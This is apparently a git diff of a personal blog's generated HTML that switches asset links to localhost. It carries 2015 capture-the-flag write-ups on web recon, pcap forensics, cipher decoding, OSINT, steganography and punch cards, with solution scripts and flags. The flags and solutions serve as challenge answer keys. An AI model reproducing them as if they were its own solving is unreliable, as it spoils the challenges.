-<p><a href="https://viviturtle.github.io/images/rc3/Goal/Response.png"><img src="https://viviturtle.github.io/images/rc3/Goal/Response.png" alt="Response"></a></p>
+<p><a href="http://localhost:4000/images/rc3/Goal/Response.png"><img src="http://localhost:4000/images/rc3/Goal/Response.png" alt="Response"></a></p>
 
 <pre><code>HTTP/1.1 200 OK
 Date: Sat, 21 Nov 2015 20:07:23 GMT
@@ -1147,7 +1379,7 @@ Content-Type: text/html; charset=UTF-8
         </header>
 
         <section class="post-content short-diver" itemprop="articleBody">
-            <p><a href="https://viviturtle.github.io/images/rc3/Start.png"><img src="https://viviturtle.github.io/images/rc3/Start.png" alt="Start"></a></p>
+            <p><a href="http://localhost:4000/images/rc3/Start.png"><img src="http://localhost:4000/images/rc3/Start.png" alt="Start"></a></p>
 
 <p>This a baby CTF question. It was very simple. We are given a link: <a href="http://129.21.39.225:81/">http://129.21.39.225:81/</a>. Upon visiting the site we are greeted with a simple text</p>
 
@@ -1157,13 +1389,13 @@ Content-Type: text/html; charset=UTF-8
 
 <p>Now look at the title of the web page.</p>
 
-<p><a href="https://viviturtle.github.io/images/rc3/bots.png"><img src="https://viviturtle.github.io/images/rc3/bots.png" alt="bots"></a></p>
+<p><a href="http://localhost:4000/images/rc3/bots.png"><img src="http://localhost:4000/images/rc3/bots.png" alt="bots"></a></p>
 
 <p>It says Go away bots! This means they don’t want a web crawler to be at this website. If you guys know basic web, the way you keep web crawlers from visiting certain web pages is to write it in the <strong>robots.txt</strong> file.</p>
 
 <p>Let’s visit <a href="http://129.21.39.225:81/robots.txt">http://129.21.39.225:81/robots.txt</a></p>
 
-<p><a href="https://viviturtle.github.io/assets/rc3/robots.txt">robots.txt</a></p>
+<p><a href="http://localhost:4000/assets/rc3/robots.txt">robots.txt</a></p>
 
 <pre><code>#Now those silly bots can't crawl my site :3
 
@@ -1176,7 +1408,7 @@ Disallow: /secret/
 
 <p>Let’s visit <a href="http://129.21.39.225:81/secret">http://129.21.39.225:81/secret</a> too</p>
 
-<p><a href="https://viviturtle.github.io/images/rc3/flag.png"><img src="https://viviturtle.github.io/images/rc3/flag.png" alt="flag"></a></p>
+<p><a href="http://localhost:4000/images/rc3/flag.png"><img src="http://localhost:4000/images/rc3/flag.png" alt="flag"></a></p>
 
 <p>Now we have the flag:</p>
 
@@ -1263,12 +1495,12 @@ Help me find flag through all these packets.</p>
 </blockquote>
 
 <blockquote>
-  <p><a href="https://viviturtle.github.io/assets/csaw/net_756d631588cb0a400cc16d1848a5f0fb.pcap">net_756d631588cb0a400cc16d1848a5f0fb.pcap</a></p>
+  <p><a href="http://localhost:4000/assets/csaw/net_756d631588cb0a400cc16d1848a5f0fb.pcap">net_756d631588cb0a400cc16d1848a5f0fb.pcap</a></p>
 </blockquote>
 
 <p>This was a fairly easy forensics question, although it could of easily been worth 150 considering how much easier the other forensics ones were. It combined a packet capture with some python programming for basic cryptographic ciphers.</p>
 
-<p>We given a link to a pcap file: <a href="https://viviturtle.github.io/assets/csaw/net_756d631588cb0a400cc16d1848a5f0fb.pcap">net_756d631588cb0a400cc16d1848a5f0fb.pcap</a>. Thinking it would be quite easy, I strings the pcap file looking for “flag”</p>
+<p>We given a link to a pcap file: <a href="http://localhost:4000/assets/csaw/net_756d631588cb0a400cc16d1848a5f0fb.pcap">net_756d631588cb0a400cc16d1848a5f0fb.pcap</a>. Thinking it would be quite easy, I strings the pcap file looking for “flag”</p>
 
 <blockquote>
   <table>
@@ -1300,16 +1532,16 @@ Help me find flag through all these packets.</p>
 
 <p>After that didn’t work, I inspected it in wireshark, our great packet inspection tool, and was given a huge list of packets(2000 to be exact).I spent some time following several TCP streams (right click packet -&gt; Follow TCP Stream) and we can see the packets included traffic from reddit, facebook and symantec to name a few.</p>
 
-<p><a href="https://viviturtle.github.io/images/csaw/Example.png"><img src="https://viviturtle.github.io/images/csaw/Example.png" alt="Example"></a></p>
+<p><a href="http://localhost:4000/images/csaw/Example.png"><img src="http://localhost:4000/images/csaw/Example.png" alt="Example"></a></p>
 
 <p>When we get to packets 150-300ish, we see something very interesting.</p>
 
-<p><a href="https://viviturtle.github.io/images/csaw/Python.png"><img src="https://viviturtle.github.io/images/csaw//Python.png" alt="Python"></a></p>
+<p><a href="http://localhost:4000/images/csaw/Python.png"><img src="http://localhost:4000/images/csaw//Python.png" alt="Python"></a></p>
 
 <p>We can clearly see the flag is somewhere in there, so I saved the file on my pc.
 After dissecting what this is, it is clearly python code in which some “flag” was encrypted with caesar ciphers, rot13, and base64, all of which are broken.</p>
 
-<p><a href="https://viviturtle.github.io/assets/csaw/net_original.py">net_original.py</a></p>
+<p><a href="http://localhost:4000/assets/csaw/net_original.py">net_original.py</a></p>
 
 <figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">string</span>
 <span class="kn">import</span> <span class="nn">random</span>
@@ -1369,7 +1601,7 @@ After dissecting what this is, it is clearly python code in which some “flag�
 
 <p>From this code we clearly see what we have to do is take the first integer of the output (which is the long string after the print), subtract one, and apply the decryption cipers (which we had to make) based on that integer. We can keep doing this until the final string contains the word flag. The following code is my final code to get the flag.</p>
 
-<p><a href="https://viviturtle.github.io/assets/csaw/net_solution.py">net_solution.py</a></p>
+<p><a href="http://localhost:4000/assets/csaw/net_solution.py">net_solution.py</a></p>
 
 <figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">string</span>
 <span class="kn">import</span> <span class="nn">random</span>
@@ -1498,7 +1730,7 @@ After dissecting what this is, it is clearly python code in which some “flag�
 
 <p><a href="http://fuzyll.com/csaw2015/start">http://fuzyll.com/csaw2015/start</a></p>
 
-<p><a href="https://viviturtle.github.io/images/csaw/step1.png"><img src="https://viviturtle.github.io/images/csaw/step1.png" alt="Start"></a></p>
+<p><a href="http://localhost:4000/images/csaw/step1.png"><img src="http://localhost:4000/images/csaw/step1.png" alt="Start"></a></p>
 
 <p>Upon entering link we are greeted with just a few lines of text:</p>
 
@@ -1509,7 +1741,7 @@ After dissecting what this is, it is clearly python code in which some “flag�
 
 <p>I found his <a href="https://www.linkedin.com/in/fuzyll">LinkedIn</a> by using the same domain as his website (https://www.linkedin.com/in/fuzyll). We can assume this his online handle.</p>
 
-<p><a href="https://viviturtle.github.io/images/csaw/LinkedIn.png"><img src="https://viviturtle.github.io/images/csaw/LinkedIn.png" alt="LinkedinScreen"></a></p>
+<p><a href="http://localhost:4000/images/csaw/LinkedIn.png"><img src="http://localhost:4000/images/csaw/LinkedIn.png" alt="LinkedinScreen"></a></p>
 
 <p>Upon checking his LinkedIn, we see he went to the University of South Florida.</p>
 
@@ -1521,7 +1753,7 @@ Education: 	University of South Florida
 <p>After which we can google “University of south florida hacking club” which brings us to:</p>
 
 <p><a href="http://www.wcsc.usf.edu/">Whitehatters Computer Security Club</a>
-<a href="https://viviturtle.github.io/images/csaw/wcsc.png"><img src="https://viviturtle.github.io/images/csaw/wcsc.png" alt="wcsc"></a></p>
+<a href="http://localhost:4000/images/csaw/wcsc.png"><img src="http://localhost:4000/images/csaw/wcsc.png" alt="wcsc"></a></p>
 
 <p>On this page we can clearly see the acronym: wcsc</p>
 
@@ -1536,7 +1768,7 @@ Education: 	University of South Florida
 </code></pre>
 <p>I googled “Fuzyll Smash” and arrived at a few <a href="https://www.youtube.com/watch?v=59QQ9UevSuE">YouTube</a> Pages.</p>
 
-<p><a href="https://viviturtle.github.io/images/csaw/youtube.png"><img src="https://viviturtle.github.io/images/csaw/youtube.png" alt="youtube"></a></p>
+<p><a href="http://localhost:4000/images/csaw/youtube.png"><img src="http://localhost:4000/images/csaw/youtube.png" alt="youtube"></a></p>
 
 <p>The answer here is from the title is Yoshi:</p>
 
@@ -1545,7 +1777,7 @@ Education: 	University of South Florida
 
 <p>One step closer, we move on to the next page: <a href="http://fuzyll.com/csaw2015/yoshi">http://fuzyll.com/csaw2015/yoshi</a>. We see a picture of yoshi here.</p>
 
-<p><a href="https://viviturtle.github.io/images/csaw/yoshi.txt"><img src="https://viviturtle.github.io/images/csaw/yoshi.txt" alt="Yoshi"></a></p>
+<p><a href="http://localhost:4000/images/csaw/yoshi.txt"><img src="http://localhost:4000/images/csaw/yoshi.txt" alt="Yoshi"></a></p>
 
 <p>Noticing we have a picture, a good step would probably be to look at the metadeta. After downloading the picture, you can either upload it to <a href="http://regex.info/exif.cgi">Jeffrey’s Exif viewer</a> or run exiftool, a tool to look at metadeta for like everything.</p>
 
@@ -1612,7 +1844,7 @@ Image Size                      : 500x537
 
 <p>I modified the js to pretty much do the same exact thing, but with the string given.</p>
 
-<p><a href="https://viviturtle.github.io/assets/csaw/javascript_decode.js">javascript_decode.js</a></p>
+<p><a href="http://localhost:4000/assets/csaw/javascript_decode.js">javascript_decode.js</a></p>
 
 <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="s2">"Pla$ja|p$wpkt$kj$}kqv$uqawp$mw&gt;$+gwes6451+pla}[waa[ia[vkhhmj"</span>
 <span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="s2">""</span>
@@ -1701,7 +1933,7 @@ Image Size                      : 500x537
                 <time datetime="2015-09-18T21:59:33-07:00" itemprop="datePublished">Sep 18, 2015</time> 
                 on
                 
-                <span><a href="">Forensics</a></span>
+                <span><a href="">Stego</a></span>
                 
                 <span><a href="">CTF</a></span>
                 
@@ -1720,11 +1952,11 @@ Image Size                      : 500x537
 </blockquote>
 
 <blockquote>
-  <p><a href="https://viviturtle.github.io/images/csaw/img.jpg">img.jpg</a></p>
+  <p><a href="http://localhost:4000/images/csaw/img.jpg">img.jpg</a></p>
 </blockquote>
 
 <p>This one had a super easy solution. First it gave us a jpg. 
-<a href="https://viviturtle.github.io/images/csaw/img.jpg"><img src="https://viviturtle.github.io/images/csaw/img.jpg" alt="img.jpg"></a></p>
+<a href="http://localhost:4000/images/csaw/img.jpg"><img src="http://localhost:4000/images/csaw/img.jpg" alt="img.jpg"></a></p>
 
 <p>First thing I always do is run strings</p>
 
@@ -1868,7 +2100,7 @@ Image Size                      : 600x700
 <p>Looking through his tweets we slowly find the answer.</p>
 
 <p>https://twitter.com/HockeyInJune/status/641716034068684800
-<a href="https://viviturtle.github.io/images/csaw/twitter.png"><img src="https://viviturtle.github.io/images/csaw/twitter.png" alt="Twitter Screenshot"></a></p>
+<a href="http://localhost:4000/images/csaw/twitter.png"><img src="http://localhost:4000/images/csaw/twitter.png" alt="Twitter Screenshot"></a></p>
 
 <p>flag{f7da7636727524d8681ab0d2a072d663}</p>
 
@@ -1968,7 +2200,7 @@ Image Size                      : 600x700
   </table>
 </blockquote>
 
-<p><a href="https://viviturtle.github.io/assets/csaw/answer.txt">answer.txt</a></p>
+<p><a href="http://localhost:4000/assets/csaw/answer.txt">answer.txt</a></p>
 
 <pre><code>    Like to a vagabond flag upon the stream,
     Than was his loss, to course your flying flags
@@ -2414,7 +2646,7 @@ flag{b3l0w_th3_r4dar}
     <article class="post single-post" itemscope itemtype="http://schema.org/BlogPosting">
 
         <header class="post-header short-diver">
-            <h1 class="post-title" itemprop="name headline">OpenToAll 2015 ~ Math is Hard: MISC 200</h1>
+            <h1 class="post-title" itemprop="name headline">OpenToAll 2015 ~ Math is Hard: Misc 200</h1>
             <section class="post-meta">
                 <time datetime="2015-03-30T22:59:33-07:00" itemprop="datePublished">Mar 30, 2015</time> 
                 on
@@ -2573,9 +2805,9 @@ s.send(str(answer) + '\n')
   <p>Hey, thanks buddy! Here’s a little somethin’ for your trouble: flag{l3ts_g0_shOpP1ng}</p>
 </blockquote>
 
-<p>With this we were given the flag to gain the team another 200 points! Wohoo. The final code is found below. The final ouput was also saved <a href="https://viviturtle.github.io/assets/open2all/Netcat_output_Final">here</a></p>
+<p>With this we were given the flag to gain the team another 200 points! Wohoo. The final code is found below. The final ouput was also saved <a href="http://localhost:4000/assets/open2all/Netcat_output_Final">here</a></p>
 
-<p><a href="https://viviturtle.github.io/assets/open2all/math.py">math.py</a></p>
+<p><a href="http://localhost:4000/assets/open2all/math.py">math.py</a></p>
 
 <figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/env python</span>
 <span class="kn">import</span> <span class="nn">time</span>
@@ -2855,7 +3087,7 @@ s.send(str(answer) + '\n')
     <article class="post single-post" itemscope itemtype="http://schema.org/BlogPosting">
 
         <header class="post-header short-diver">
-            <h1 class="post-title" itemprop="name headline">OpenToAll 2015 ~ BACH: CRYPTO 150</h1>
+            <h1 class="post-title" itemprop="name headline">OpenToAll 2015 ~ BACH: Crypto 150</h1>
             <section class="post-meta">
                 <time datetime="2015-03-28T22:59:33-07:00" itemprop="datePublished">Mar 28, 2015</time> 
                 on
@@ -2877,7 +3109,7 @@ Author: Eriner</p>
 
 <p>This challenge was quite a simple Cryptography challenge given that it requires zero knowledge of ciphers or anything else related to cryptopgrahy. We were given a link to download the file : 8aec78b8dca5541b69d07404f1a6be68.tar.bz2 which contained a single image.</p>
 
-<p><a href="https://viviturtle.github.io/images/open2all/f4923a0aa2a3cc07026e38f41b3cd673.png"><img src="https://viviturtle.github.io/images/open2all/f4923a0aa2a3cc07026e38f41b3cd673.png" alt="Bach"></a></p>
+<p><a href="http://localhost:4000/images/open2all/f4923a0aa2a3cc07026e38f41b3cd673.png"><img src="http://localhost:4000/images/open2all/f4923a0aa2a3cc07026e38f41b3cd673.png" alt="Bach"></a></p>
 
 <p>Given my piano background, I began to read the notes for what they were ignoring all the naturals thinking they had nothing to do with the code.</p>
 
@@ -2944,7 +3176,7 @@ Author: Eriner</p>
 
 <p>Deciphering the image, the sentence says, the flag is erinsersmusicalmasterpiece. I inserted “Flag{erinsersmusicalmasterpiece}” to score my club another 150 points in the CTF.</p>
 
-<p><a href="https://viviturtle.github.io/assets/open2all/bruteforce.py">Bruteforce.py</a></p>
+<p><a href="http://localhost:4000/assets/open2all/bruteforce.py">Bruteforce.py</a></p>
 
 <figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/env python</span>
 
@@ -3078,27 +3310,27 @@ Author: Eriner</p>
 <p>Along with a link to<br>
 http://bostonkeyparty.net/haymarket.tar.gz.fe35f59bfa869a0555e9972efa3ddd2d.</p>
 
-<p>If the above link is down, you can probably get it at <a href="https://viviturtle.github.io/assets/bkpctf/haymarket.tar">haymarket.tar</a></p>
+<p>If the above link is down, you can probably get it at <a href="http://localhost:4000/assets/bkpctf/haymarket.tar">haymarket.tar</a></p>
 
 <p>So, after renaming the file to haymarket.tar.gz and extracting it via cmd line with “tar -zxvf haymarket.tar.gz” We were given 32 PNG’s of punch cards.</p>
 
-<p><a href="https://viviturtle.github.io/images/bkpctf//L1.png"><img src="https://viviturtle.github.io/images/bkpctf//L1.png" alt="Punchcard 1"></a></p>
+<p><a href="http://localhost:4000/images/bkpctf//L1.png"><img src="http://localhost:4000/images/bkpctf//L1.png" alt="Punchcard 1"></a></p>
 
-<p><a href="https://viviturtle.github.io/images/bkpctf//L20.png"><img src="https://viviturtle.github.io/images/bkpctf//L20.png" alt="Punchcard 20"></a></p>
+<p><a href="http://localhost:4000/images/bkpctf//L20.png"><img src="http://localhost:4000/images/bkpctf//L20.png" alt="Punchcard 20"></a></p>
 
 <p>Doing what we hackers do best, I went and Googled how to read Punch Cards. I eventually found this fairly descriptive History of Punchcards (http://www.masswerk.at/keypunch/) . Sorry, but I have no time to read history. After more Googling, I found this virtual keyboard (http://www.masswerk.at/keypunch/). I figured I take my chances here and quickly learn the translation of keys to bullet points. Indeed, the translation went well. I quickly typed out every letter and every available punctuation to get a quick translation.</p>
 
-<p><a href="https://viviturtle.github.io/images/bkpctf//Keyboard.png"><img src="https://viviturtle.github.io/images/bkpctf//Keyboard.png" alt="Virtual Keyboard"></a></p>
+<p><a href="http://localhost:4000/images/bkpctf//Keyboard.png"><img src="http://localhost:4000/images/bkpctf//Keyboard.png" alt="Virtual Keyboard"></a></p>
 
 <p>Now that I had the translation of bullets to ASCII, I just had to write a program. I Googled how to read images from Python and it was fairly simple. Using that code I got to business. I was of course missing things like rows, columns, RGB color, and pixel offesets. Most of these I was able to get looking at each image in GIMP’s (a very bad free Linux version of Photoshop in my opinion) color picker and image properties.</p>
 
-<p><a href="https://viviturtle.github.io/images/bkpctf//GIMP.png"><img src="https://viviturtle.github.io/images/bkpctf//GIMP.png" alt="Virtual Keyboard"></a></p>
+<p><a href="http://localhost:4000/images/bkpctf//GIMP.png"><img src="http://localhost:4000/images/bkpctf//GIMP.png" alt="Virtual Keyboard"></a></p>
 
 <p>The hosts were kind enough to provide us with a uniform size and offset for each row and column. The first bullet was at (17,24), the next column was 7 pixels across, and the next row was 20 pixels down. The color of the bullets were RGB (20,20,20). All that was left was a simple nested for loop of recording RGB’s and translating their row locations to ASCII. If you want to see the output for all the PNG’s you can find it at My GitHub. After running my script on all the PNGs you get to a line that says display key(set alextrebekisasocialengineer) and indeed “alextrebekisasocialengineer” is the flag. Congratulations! I did it.</p>
 
 <p>In conclusion, I would like to thank Boston Key Party 2015 for this great challenge. It was a great way for me to refresh my Python programming while learning about punch cards. Again I look forward for next years competition.</p>
 
-<p><a href="https://viviturtle.github.io/assets/bkpctf/Punchcard.py">Punchcard.py</a></p>
+<p><a href="http://localhost:4000/assets/bkpctf/Punchcard.py">Punchcard.py</a></p>
 
 <figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">Note</span><span class="p">:</span> <span class="n">I</span> <span class="n">ignored</span> <span class="n">the</span> <span class="n">numbers</span> <span class="ow">and</span> <span class="n">just</span> <span class="n">went</span> <span class="kn">from</span> <span class="err">1-13</span> <span class="nn">rows</span> <span class="nn">with</span> <span class="nn">zero</span><span class="err">'</span><span class="nn">s</span> <span class="nn">as</span> <span class="nn">the</span> <span class="nn">default</span> <span class="nn">value.</span><span class="err">
 
